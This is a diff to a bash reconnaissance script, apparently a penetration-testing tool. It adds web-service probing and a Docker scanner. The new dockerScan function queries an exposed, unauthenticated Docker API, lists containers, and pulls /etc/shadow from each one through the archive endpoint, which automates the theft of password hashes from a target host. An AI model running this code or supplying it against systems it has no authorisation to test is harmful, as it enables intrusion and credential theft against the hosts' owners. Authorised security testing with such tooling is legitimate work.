@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20171023 Kirby
+# 20171025 Kirby
 
 
 umask 077
@@ -64,6 +64,21 @@ function MAIN()
         then
             echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
         fi
+
+        # sometimes nmap can't identify a web service, so just try anyways
+        if $TIMEOUT 60 wget --tries=1 -O /dev/null --no-check-certificate -S  -D $TARGET \
+            --method=HEAD http://${TARGET}:${port} 2>&1 \
+            |egrep -qi 'HTTP/|X-|Content|Date'
+        then
+            echo "http://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
+        fi
+        if $TIMEOUT 60 wget --tries=1 -O /dev/null --no-check-certificate -S  -D $TARGET \
+            --method=HEAD https://${TARGET}:${port} 2>&1 \
+            |egrep -qi 'HTTP/|X-|Content|Date'
+        then
+            echo "https://${TARGET}:${port}" >> "$RECONDIR"/${TARGET}.baseurls
+        fi
+
     
         # rsh
         if echo $rawport |egrep -q '^514/open'
@@ -135,6 +150,13 @@ function MAIN()
         then
             echo "starting iscsiScan"
             iscsiScan $port
+        fi
+    
+        # docker
+        if echo $rawport |egrep -q '[[:digit:]]+/open/tcp//docker//Docker'
+        then
+            echo "starting dockerScan"
+            dockerScan $port &
         fi
     
     done
@@ -828,6 +850,38 @@ function smbScan()
 ################################################################################
 
 ################################################################################
+function dockerScan()
+{
+    local port=$1
+    local id
+
+    $TIMEOUT 60 curl http://${TARGET}:$port/info 2>/dev/null|jq -M . \
+        >> "$RECONDIR"/${TARGET}.dockerinfo 2>&1
+
+    $TIMEOUT 60 curl http://${TARGET}:$port/networks 2>/dev/null|jq -M . \
+        >> "$RECONDIR"/${TARGET}.dockernetworks 2>&1
+
+    $TIMEOUT 60 curl http://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
+        >> "$RECONDIR"/${TARGET}.dockercontainers 2>&1
+
+    for id in $(grep '"Id": ' "$RECONDIR"/${TARGET}.dockercontainers |cut -d'"' -f4)
+    do
+        $TIMEOUT 60 curl http://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
+            >> "$RECONDIR"/${TARGET}.${id}.dockertop
+        $TIMEOUT 60 curl http://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
+            >> "$RECONDIR"/${TARGET}.${id}.dockerchanges
+        $TIMEOUT 60 curl "http://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
+            2>/dev/null|tar xf - -O \
+            >> "$RECONDIR"/${TARGET}.${id}.dockershadow
+
+    done
+
+
+    return 0
+}
+################################################################################
+
+################################################################################
 function iscsiScan()
 {
     local port=$1
@@ -1350,7 +1404,7 @@ function exifScanURLs()
         |egrep -i '\.(jpg|jpeg|tif|tiff|wav)$')
     do   
         # download files to /tmp because my /tmp is tmpfs (less i/o)
-        wget -q --no-check-certificate -D $TARGET -O /tmp/${TARGET}.exiftestfile "$url"
+        $TIMEOUT 60 wget -q --no-check-certificate -D $TARGET -O /tmp/${TARGET}.exiftestfile "$url"
         if exif /tmp/${TARGET}.exiftestfile >/dev/null 2>&1 
         then 
             echo "<hr>" >> $exifreport
